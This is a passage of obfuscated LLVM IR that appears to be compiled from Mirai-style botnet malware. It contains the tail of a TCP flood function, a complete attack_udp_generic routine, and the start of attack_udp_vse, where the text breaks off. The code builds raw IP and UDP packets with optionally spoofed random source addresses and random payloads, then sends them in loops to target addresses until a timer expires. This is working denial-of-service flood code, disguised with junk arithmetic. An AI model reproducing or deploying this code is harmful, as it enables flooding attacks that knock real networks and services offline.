  %838 = add i64 %837, %836
  %839 = sub i64 %838, 5600508315444799237
  %840 = add i64 20, %836
  %841 = trunc i64 %839 to i32
  %842 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %825, i8* %827, i16 zeroext %834, i32 %841)
  %843 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %844 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %843, i32 0, i32 6
  store i16 %842, i16* %844, align 4
  %845 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %846 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %845, i32 0, i32 1
  %847 = load i16, i16* %846, align 2
  %848 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %849 = load i32, i32* %11, align 4
  %850 = sext i32 %849 to i64
  %851 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %848, i64 %850
  %852 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %851, i32 0, i32 0
  %853 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %852, i32 0, i32 1
  store i16 %847, i16* %853, align 2
  %854 = load i32, i32* %12, align 4
  %855 = load i8*, i8** %42, align 8
  %856 = load i32, i32* %26, align 4
  %857 = sext i32 %856 to i64
  %858 = add i64 40, -6581980781949419623
  %859 = add i64 %858, %857
  %860 = sub i64 %859, -6581980781949419623
  %861 = add i64 40, %857
  %862 = bitcast %union.__CONST_SOCKADDR_ARG* %46 to %struct.sockaddr**
  %863 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %864 = load i32, i32* %11, align 4
  %865 = sext i32 %864 to i64
  %866 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %863, i64 %865
  %867 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %866, i32 0, i32 0
  %868 = bitcast %struct.sockaddr_in* %867 to %struct.sockaddr*
  store %struct.sockaddr* %868, %struct.sockaddr** %862, align 8
  %869 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %46, i32 0, i32 0
  %870 = load %struct.sockaddr*, %struct.sockaddr** %869, align 8
  %871 = call i64 @sendto(i32 %854, i8* %855, i64 %860, i32 16384, %struct.sockaddr* %870, i32 16)
  br label %872

; <label>:872:                                    ; preds = %789
  %873 = load i32, i32* %11, align 4
  %874 = sub i32 %873, -1929989923
  %875 = add i32 %874, 1
  %876 = add i32 %875, -1929989923
  %877 = add nsw i32 %873, 1
  store i32 %876, i32* %11, align 4
  br label %744

; <label>:878:                                    ; preds = %744
  %879 = call i64 @time(i64* null) #6
  %880 = load i32, i32* %28, align 4
  %881 = sext i32 %880 to i64
  %882 = icmp sgt i64 %879, %881
  br i1 %882, label %883, label %884

; <label>:883:                                    ; preds = %878
  br label %885

; <label>:884:                                    ; preds = %878
  br label %743

; <label>:885:                                    ; preds = %883, %235, %122, %116
  ret void
}

declare i32 @fcntl(i32, i32, ...) #3

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #3

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_generic(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i16, align 2
  %21 = alloca i8, align 1
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %31 = load i8, i8* %7, align 1
  %32 = zext i8 %31 to i64
  %33 = call noalias i8* @calloc(i64 %32, i64 8) #6
  %34 = bitcast i8* %33 to i8**
  store i8** %34, i8*** %13, align 8
  %35 = load i8, i8* %9, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 2, i32 0)
  %38 = trunc i32 %37 to i8
  store i8 %38, i8* %14, align 1
  %39 = load i8, i8* %9, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 3, i32 65535)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %15, align 2
  %43 = load i8, i8* %9, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 4, i32 64)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %16, align 1
  %47 = load i8, i8* %9, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 5, i32 0)
  %50 = trunc i32 %49 to i8
  store i8 %50, i8* %17, align 1
  %51 = load i8, i8* %9, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 6, i32 65535)
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %18, align 2
  %55 = load i8, i8* %9, align 1
  %56 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %57 = call i32 @attack_get_opt_int(i8 zeroext %55, %struct.attack_option* %56, i8 zeroext 7, i32 65535)
  %58 = trunc i32 %57 to i16
  store i16 %58, i16* %19, align 2
  %59 = load i8, i8* %9, align 1
  %60 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %61 = call i32 @attack_get_opt_int(i8 zeroext %59, %struct.attack_option* %60, i8 zeroext 0, i32 512)
  %62 = trunc i32 %61 to i16
  store i16 %62, i16* %20, align 2
  %63 = load i8, i8* %9, align 1
  %64 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %65 = call i32 @attack_get_opt_int(i8 zeroext %63, %struct.attack_option* %64, i8 zeroext 1, i32 1)
  %66 = trunc i32 %65 to i8
  store i8 %66, i8* %21, align 1
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = load i32, i32* @LOCAL_ADDR, align 4
  %70 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 19, i32 %69)
  store i32 %70, i32* %22, align 4
  %71 = call i64 @time(i64* null) #6
  %72 = load i32, i32* %6, align 4
  %73 = sext i32 %72 to i64
  %74 = sub i64 %71, -1850960439150416047
  %75 = add i64 %74, %73
  %76 = add i64 %75, -1850960439150416047
  %77 = add nsw i64 %71, %73
  %78 = trunc i64 %76 to i32
  store i32 %78, i32* %23, align 4
  %79 = load i16, i16* %20, align 2
  %80 = zext i16 %79 to i32
  %81 = icmp sgt i32 %80, 1460
  br i1 %81, label %82, label %83

; <label>:82:                                     ; preds = %5
  store i16 1460, i16* %20, align 2
  br label %83

; <label>:83:                                     ; preds = %82, %5
  %84 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %84, i32* %12, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %83
  br label %376

; <label>:87:                                     ; preds = %83
  store i32 1, i32* %11, align 4
  %88 = load i32, i32* %12, align 4
  %89 = bitcast i32* %11 to i8*
  %90 = call i32 @setsockopt(i32 %88, i32 0, i32 3, i8* %89, i32 4) #6
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %95

; <label>:92:                                     ; preds = %87
  %93 = load i32, i32* %12, align 4
  %94 = call i32 @close(i32 %93)
  br label %376

; <label>:95:                                     ; preds = %87
  store i32 0, i32* %11, align 4
  br label %96

; <label>:96:                                     ; preds = %204, %95
  %97 = load i32, i32* %11, align 4
  %98 = load i8, i8* %7, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp slt i32 %97, %99
  br i1 %100, label %101, label %211

; <label>:101:                                    ; preds = %96
  %102 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %103 = load i8**, i8*** %13, align 8
  %104 = load i32, i32* %11, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8*, i8** %103, i64 %105
  store i8* %102, i8** %106, align 8
  %107 = load i8**, i8*** %13, align 8
  %108 = load i32, i32* %11, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8*, i8** %107, i64 %109
  %111 = load i8*, i8** %110, align 8
  %112 = bitcast i8* %111 to %struct.iphdr*
  store %struct.iphdr* %112, %struct.iphdr** %24, align 8
  %113 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i64 1
  %115 = bitcast %struct.iphdr* %114 to %struct.udphdr*
  store %struct.udphdr* %115, %struct.udphdr** %25, align 8
  %116 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %117 = bitcast %struct.iphdr* %116 to i8*
  %118 = load i8, i8* %117, align 4
  %119 = xor i8 %118, -1
  %120 = xor i8 15, -1
  %121 = xor i8 -117, -1
  %122 = or i8 %119, %120
  %123 = or i8 -117, %121
  %124 = xor i8 %122, -1
  %125 = and i8 %124, %123
  %126 = and i8 %118, 15
  %127 = and i8 %125, 64
  %128 = xor i8 %125, 64
  %129 = or i8 %127, %128
  %130 = or i8 %125, 64
  store i8 %129, i8* %117, align 4
  %131 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %132 = bitcast %struct.iphdr* %131 to i8*
  %133 = load i8, i8* %132, align 4
  %134 = xor i8 %133, -1
  %135 = xor i8 -16, -1
  %136 = xor i8 -63, -1
  %137 = or i8 %134, %135
  %138 = or i8 -63, %136
  %139 = xor i8 %137, -1
  %140 = and i8 %139, %138
  %141 = and i8 %133, -16
  %142 = and i8 %140, 5
  %143 = xor i8 %140, 5
  %144 = or i8 %142, %143
  %145 = or i8 %140, 5
  store i8 %144, i8* %132, align 4
  %146 = load i8, i8* %14, align 1
  %147 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %148 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %147, i32 0, i32 1
  store i8 %146, i8* %148, align 1
  %149 = load i16, i16* %20, align 2
  %150 = zext i16 %149 to i64
  %151 = sub i64 28, -3020551751924949673
  %152 = add i64 %151, %150
  %153 = add i64 %152, -3020551751924949673
  %154 = add i64 28, %150
  %155 = trunc i64 %153 to i16
  %156 = call zeroext i16 @htons(i16 zeroext %155) #7
  %157 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %158 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %157, i32 0, i32 2
  store i16 %156, i16* %158, align 2
  %159 = load i16, i16* %15, align 2
  %160 = call zeroext i16 @htons(i16 zeroext %159) #7
  %161 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 3
  store i16 %160, i16* %162, align 4
  %163 = load i8, i8* %16, align 1
  %164 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %165 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %164, i32 0, i32 5
  store i8 %163, i8* %165, align 4
  %166 = load i8, i8* %17, align 1
  %167 = icmp ne i8 %166, 0
  br i1 %167, label %168, label %172

; <label>:168:                                    ; preds = %101
  %169 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %170 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %170, i32 0, i32 4
  store i16 %169, i16* %171, align 2
  br label %172

; <label>:172:                                    ; preds = %168, %101
  %173 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %174 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %173, i32 0, i32 6
  store i8 17, i8* %174, align 1
  %175 = load i32, i32* %22, align 4
  %176 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 8
  store i32 %175, i32* %177, align 4
  %178 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %179 = load i32, i32* %11, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %178, i64 %180
  %182 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %181, i32 0, i32 1
  %183 = load i32, i32* %182, align 4
  %184 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i32 0, i32 9
  store i32 %183, i32* %185, align 4
  %186 = load i16, i16* %18, align 2
  %187 = call zeroext i16 @htons(i16 zeroext %186) #7
  %188 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %189 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %188, i32 0, i32 0
  store i16 %187, i16* %189, align 2
  %190 = load i16, i16* %19, align 2
  %191 = call zeroext i16 @htons(i16 zeroext %190) #7
  %192 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %193 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %192, i32 0, i32 1
  store i16 %191, i16* %193, align 2
  %194 = load i16, i16* %20, align 2
  %195 = zext i16 %194 to i64
  %196 = sub i64 8, 6625149197446333674
  %197 = add i64 %196, %195
  %198 = add i64 %197, 6625149197446333674
  %199 = add i64 8, %195
  %200 = trunc i64 %198 to i16
  %201 = call zeroext i16 @htons(i16 zeroext %200) #7
  %202 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %203 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %202, i32 0, i32 2
  store i16 %201, i16* %203, align 2
  br label %204

; <label>:204:                                    ; preds = %172
  %205 = load i32, i32* %11, align 4
  %206 = sub i32 0, %205
  %207 = sub i32 0, 1
  %208 = add i32 %206, %207
  %209 = sub i32 0, %208
  %210 = add nsw i32 %205, 1
  store i32 %209, i32* %11, align 4
  br label %96

; <label>:211:                                    ; preds = %96
  br label %212

; <label>:212:                                    ; preds = %375, %211
  store i32 0, i32* %11, align 4
  br label %213

; <label>:213:                                    ; preds = %363, %212
  %214 = load i32, i32* %11, align 4
  %215 = load i8, i8* %7, align 1
  %216 = zext i8 %215 to i32
  %217 = icmp slt i32 %214, %216
  br i1 %217, label %218, label %369

; <label>:218:                                    ; preds = %213
  %219 = load i8**, i8*** %13, align 8
  %220 = load i32, i32* %11, align 4
  %221 = sext i32 %220 to i64
  %222 = getelementptr inbounds i8*, i8** %219, i64 %221
  %223 = load i8*, i8** %222, align 8
  store i8* %223, i8** %26, align 8
  %224 = load i8*, i8** %26, align 8
  %225 = bitcast i8* %224 to %struct.iphdr*
  store %struct.iphdr* %225, %struct.iphdr** %27, align 8
  %226 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %227 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %226, i64 1
  %228 = bitcast %struct.iphdr* %227 to %struct.udphdr*
  store %struct.udphdr* %228, %struct.udphdr** %28, align 8
  %229 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %230 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %229, i64 1
  %231 = bitcast %struct.udphdr* %230 to i8*
  store i8* %231, i8** %29, align 8
  %232 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %233 = load i32, i32* %11, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %232, i64 %234
  %236 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %235, i32 0, i32 2
  %237 = load i8, i8* %236, align 4
  %238 = zext i8 %237 to i32
  %239 = icmp slt i32 %238, 32
  br i1 %239, label %240, label %265

; <label>:240:                                    ; preds = %218
  %241 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %242 = load i32, i32* %11, align 4
  %243 = sext i32 %242 to i64
  %244 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %241, i64 %243
  %245 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %244, i32 0, i32 1
  %246 = load i32, i32* %245, align 4
  %247 = call i32 @ntohl(i32 %246) #7
  %248 = call i32 @rand_next()
  %249 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %250 = load i32, i32* %11, align 4
  %251 = sext i32 %250 to i64
  %252 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %249, i64 %251
  %253 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %252, i32 0, i32 2
  %254 = load i8, i8* %253, align 4
  %255 = zext i8 %254 to i32
  %256 = lshr i32 %248, %255
  %257 = sub i32 0, %247
  %258 = sub i32 0, %256
  %259 = add i32 %257, %258
  %260 = sub i32 0, %259
  %261 = add i32 %247, %256
  %262 = call i32 @htonl(i32 %260) #7
  %263 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %264 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %263, i32 0, i32 9
  store i32 %262, i32* %264, align 4
  br label %265

; <label>:265:                                    ; preds = %240, %218
  %266 = load i32, i32* %22, align 4
  %267 = icmp eq i32 %266, -1
  br i1 %267, label %268, label %272

; <label>:268:                                    ; preds = %265
  %269 = call i32 @rand_next()
  %270 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %271 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %270, i32 0, i32 8
  store i32 %269, i32* %271, align 4
  br label %272

; <label>:272:                                    ; preds = %268, %265
  %273 = load i16, i16* %15, align 2
  %274 = zext i16 %273 to i32
  %275 = icmp eq i32 %274, 65535
  br i1 %275, label %276, label %281

; <label>:276:                                    ; preds = %272
  %277 = call i32 @rand_next()
  %278 = trunc i32 %277 to i16
  %279 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %280 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %279, i32 0, i32 3
  store i16 %278, i16* %280, align 4
  br label %281

; <label>:281:                                    ; preds = %276, %272
  %282 = load i16, i16* %18, align 2
  %283 = zext i16 %282 to i32
  %284 = icmp eq i32 %283, 65535
  br i1 %284, label %285, label %290

; <label>:285:                                    ; preds = %281
  %286 = call i32 @rand_next()
  %287 = trunc i32 %286 to i16
  %288 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %289 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %288, i32 0, i32 0
  store i16 %287, i16* %289, align 2
  br label %290

; <label>:290:                                    ; preds = %285, %281
  %291 = load i16, i16* %19, align 2
  %292 = zext i16 %291 to i32
  %293 = icmp eq i32 %292, 65535
  br i1 %293, label %294, label %299

; <label>:294:                                    ; preds = %290
  %295 = call i32 @rand_next()
  %296 = trunc i32 %295 to i16
  %297 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %298 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %297, i32 0, i32 1
  store i16 %296, i16* %298, align 2
  br label %299

; <label>:299:                                    ; preds = %294, %290
  %300 = load i8, i8* %21, align 1
  %301 = icmp ne i8 %300, 0
  br i1 %301, label %302, label %310

; <label>:302:                                    ; preds = %299
  %303 = load i8*, i8** %29, align 8
  %304 = load i16, i16* %20, align 2
  %305 = zext i16 %304 to i32
  call void @rand_alpha_str(i8* %303, i32 %305)
  %306 = load i8*, i8** %29, align 8
  %307 = load i16, i16* %20, align 2
  %308 = zext i16 %307 to i64
  %309 = getelementptr inbounds i8, i8* %306, i64 %308
  store i8 0, i8* %309, align 1
  br label %310

; <label>:310:                                    ; preds = %302, %299
  %311 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %312 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %311, i32 0, i32 7
  store i16 0, i16* %312, align 2
  %313 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %314 = bitcast %struct.iphdr* %313 to i16*
  %315 = call zeroext i16 @checksum_generic(i16* %314, i32 20)
  %316 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %317 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %316, i32 0, i32 7
  store i16 %315, i16* %317, align 2
  %318 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %319 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %318, i32 0, i32 3
  store i16 0, i16* %319, align 2
  %320 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %321 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %322 = bitcast %struct.udphdr* %321 to i8*
  %323 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %324 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %323, i32 0, i32 2
  %325 = load i16, i16* %324, align 2
  %326 = load i16, i16* %20, align 2
  %327 = zext i16 %326 to i64
  %328 = add i64 8, -3927352379747693494
  %329 = add i64 %328, %327
  %330 = sub i64 %329, -3927352379747693494
  %331 = add i64 8, %327
  %332 = trunc i64 %330 to i32
  %333 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %320, i8* %322, i16 zeroext %325, i32 %332)
  %334 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %335 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %334, i32 0, i32 3
  store i16 %333, i16* %335, align 2
  %336 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %337 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %336, i32 0, i32 1
  %338 = load i16, i16* %337, align 2
  %339 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %340 = load i32, i32* %11, align 4
  %341 = sext i32 %340 to i64
  %342 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %339, i64 %341
  %343 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %342, i32 0, i32 0
  %344 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %343, i32 0, i32 1
  store i16 %338, i16* %344, align 2
  %345 = load i32, i32* %12, align 4
  %346 = load i8*, i8** %26, align 8
  %347 = load i16, i16* %20, align 2
  %348 = zext i16 %347 to i64
  %349 = sub i64 28, -5719568324717659879
  %350 = add i64 %349, %348
  %351 = add i64 %350, -5719568324717659879
  %352 = add i64 28, %348
  %353 = bitcast %union.__CONST_SOCKADDR_ARG* %30 to %struct.sockaddr**
  %354 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %355 = load i32, i32* %11, align 4
  %356 = sext i32 %355 to i64
  %357 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %354, i64 %356
  %358 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %357, i32 0, i32 0
  %359 = bitcast %struct.sockaddr_in* %358 to %struct.sockaddr*
  store %struct.sockaddr* %359, %struct.sockaddr** %353, align 8
  %360 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %30, i32 0, i32 0
  %361 = load %struct.sockaddr*, %struct.sockaddr** %360, align 8
  %362 = call i64 @sendto(i32 %345, i8* %346, i64 %351, i32 16384, %struct.sockaddr* %361, i32 16)
  br label %363

; <label>:363:                                    ; preds = %310
  %364 = load i32, i32* %11, align 4
  %365 = sub i32 %364, -387239483
  %366 = add i32 %365, 1
  %367 = add i32 %366, -387239483
  %368 = add nsw i32 %364, 1
  store i32 %367, i32* %11, align 4
  br label %213

; <label>:369:                                    ; preds = %213
  %370 = call i64 @time(i64* null) #6
  %371 = load i32, i32* %23, align 4
  %372 = sext i32 %371 to i64
  %373 = icmp sgt i64 %370, %372
  br i1 %373, label %374, label %375

; <label>:374:                                    ; preds = %369
  br label %376

; <label>:375:                                    ; preds = %369
  br label %212

; <label>:376:                                    ; preds = %374, %92, %86
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_vse(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca %struct.iphdr*, align 8
  %24 = alloca %struct.udphdr*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %30 = load i8, i8* %7, align 1
  %31 = zext i8 %30 to i64
  %32 = call noalias i8* @calloc(i64 %31, i64 8) #6
  %33 = bitcast i8* %32 to i8**
  store i8** %33, i8*** %13, align 8
  %34 = load i8, i8* %9, align 1
  %35 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %36 = call i32 @attack_get_opt_int(i8 zeroext %34, %struct.attack_option* %35, i8 zeroext 2, i32 0)
  %37 = trunc i32 %36 to i8
  store i8 %37, i8* %14, align 1
  %38 = load i8, i8* %9, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 3, i32 65535)
  %41 = trunc i32 %40 to i16
  store i16 %41, i16* %15, align 2
  %42 = load i8, i8* %9, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 4, i32 64)
  %45 = trunc i32 %44 to i8
  store i8 %45, i8* %16, align 1
  %46 = load i8, i8* %9, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 5, i32 0)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %17, align 1
  %50 = load i8, i8* %9, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 6, i32 65535)
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %18, align 2
  %54 = load i8, i8* %9, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 7, i32 27015)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %19, align 2
  store i32 0, i32* %21, align 4
  %58 = call i64 @time(i64* null) #6
  %59 = load i32, i32* %6, align 4
  %60 = sext i32 %59 to i64
  %61 = sub i64 0, %58
  %62 = sub i64 0, %60
  %63 = add i64 %61, %62
  %64 = sub i64 0, %63
  %65 = add nsw i64 %58, %60
  %66 = trunc i64 %64 to i32
  store i32 %66, i32* %22, align 4
  call void @table_unlock_val(i8 zeroext 36)
  %67 = call i8* @table_retrieve_val(i32 36, i32* %21)
  store i8* %67, i8** %20, align 8
  %68 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %68, i32* %12, align 4
  %69 = icmp eq i32 %68, -1
  br i1 %69, label %70, label %71

; <label>:70:                                     ; preds = %5
  br label %339

; <label>:71:                                     ; preds = %5
  store i32 1, i32* %11, align 4
  %72 = load i32, i32* %12, align 4
  %73 = bitcast i32* %11 to i8*
  %74 = call i32 @setsockopt(i32 %72, i32 0, i32 3, i8* %73, i32 4) #6
  %75 = icmp eq i32 %74, -1
  br i1 %75, label %76, label %79

; <label>:76:                                     ; preds = %71
  %77 = load i32, i32* %12, align 4
  %78 = call i32 @close(i32 %77)
  br label %339

; <label>:79:                                     ; preds = %71
  store i32 0, i32* %11, align 4
  br label %80

; <label>:80:                                     ; preds = %189, %79
  %81 = load i32, i32* %11, align 4
  %82 = load i8, i8* %7, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp slt i32 %81, %83
  br i1 %84, label %85, label %194

; <label>:85:                                     ; preds = %80
  %86 = call noalias i8* @calloc(i64 128, i64 1) #6
  %87 = load i8**, i8*** %13, align 8
  %88 = load i32, i32* %11, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds i8*, i8** %87, i64 %89
  store i8* %86, i8** %90, align 8
  %91 = load i8**, i8*** %13, align 8
  %92 = load i32, i32* %11, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds i8*, i8** %91, i64 %93
  %95 = load i8*, i8** %94, align 8
  %96 = bitcast i8* %95 to %struct.iphdr*
  store %struct.iphdr* %96, %struct.iphdr** %23, align 8
  %97 = load %struct.iphdr*, %struct.iphdr** %23, align 8
